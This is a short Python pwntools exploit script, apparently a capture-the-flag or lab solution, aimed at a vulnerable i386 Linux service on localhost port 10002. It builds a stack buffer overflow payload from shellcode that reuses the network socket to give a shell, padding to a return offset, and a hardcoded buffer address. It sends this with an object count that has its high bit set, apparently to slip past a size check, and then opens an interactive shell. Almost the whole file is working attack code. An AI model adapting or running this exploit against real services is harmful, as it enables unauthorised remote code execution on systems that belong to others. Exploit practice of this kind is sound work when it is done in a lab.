#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(arch = "i386", os = "linux")

RET_OFFSET = 332 #Found by sending cyclic data
USER_SIZE = 40
START_OF_BUFFER = 0xffffd580 #ECX pointed there when we crashed the process with cyclic data
                             #Your process is probably mapped differently
SHELLCODE = asm(shellcraft.findpeersh())
PAYLOAD = flat(SHELLCODE,
               'A' * (RET_OFFSET - len(SHELLCODE)),
               START_OF_BUFFER)
#Make payload a multiple of 'USER_SIZE'
while not len(PAYLOAD) % USER_SIZE == 0:
    PAYLOAD += 'A'
NUM_USER_OBJECTS = len(PAYLOAD) / USER_SIZE

r = remote('localhost', 10002)
r.send(flat(NUM_USER_OBJECTS | 0x80000000, PAYLOAD))
r.interactive()
